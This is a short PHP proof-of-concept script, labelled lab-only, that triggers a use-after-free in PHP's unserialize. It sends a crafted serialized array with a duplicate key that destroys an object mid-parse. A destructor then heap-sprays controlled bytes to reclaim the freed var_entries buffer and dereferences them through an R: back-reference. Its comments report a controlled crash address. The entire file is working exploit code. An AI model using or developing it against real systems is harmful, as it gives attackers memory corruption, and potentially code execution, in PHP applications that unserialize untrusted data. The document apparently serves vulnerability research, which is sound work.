<?php
/* var_destroy UAF — reclaim spray probe (lab-only).
 * argv[1]=spray count, argv[2]=string length, argv[3]=R: index,
 * argv[4]=fill byte (hex, default 41).
 * A reclaimed var_entries makes R:1020 dereference the spray bytes as a
 * zval*. With fill 0x41 the process faults at 0x4141414141414149
 * (x0 = 0x4141414141414141) inside php_var_unserialize:
 *   php verify_var_destroy_spray.php 64 8135 1020 41
 */
$CNT = (int)($argv[1] ?? 32);
$LEN = (int)($argv[2] ?? 8135);
$IDX = (int)($argv[3] ?? 1);
$FILL = hex2bin($argv[4] ?? '41');
$GLOBALS['CNT'] = $CNT; $GLOBALS['LEN'] = $LEN;
$GLOBALS['IDX'] = $IDX; $GLOBALS['FILL'] = $FILL;

class T {
    public function __destruct() {
        $spray = [];
        for ($i = 0; $i < $GLOBALS['CNT']; $i++) {
            $spray[] = str_repeat($GLOBALS['FILL'], $GLOBALS['LEN']);
        }
        $r = @unserialize('R:' . $GLOBALS['IDX'] . ';');
        fwrite(STDERR, "spray=" . $GLOBALS['CNT'] . " len=" . $GLOBALS['LEN']
            . " idx=" . $GLOBALS['IDX'] . " result=" . gettype($r) . "\n");
    }
}

$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) $p .= 'i:0;N;';
$p .= 'i:99999;O:1:"T":0:{}i:99999;i:42;}';
@unserialize($p);
fwrite(STDERR, "done\n");
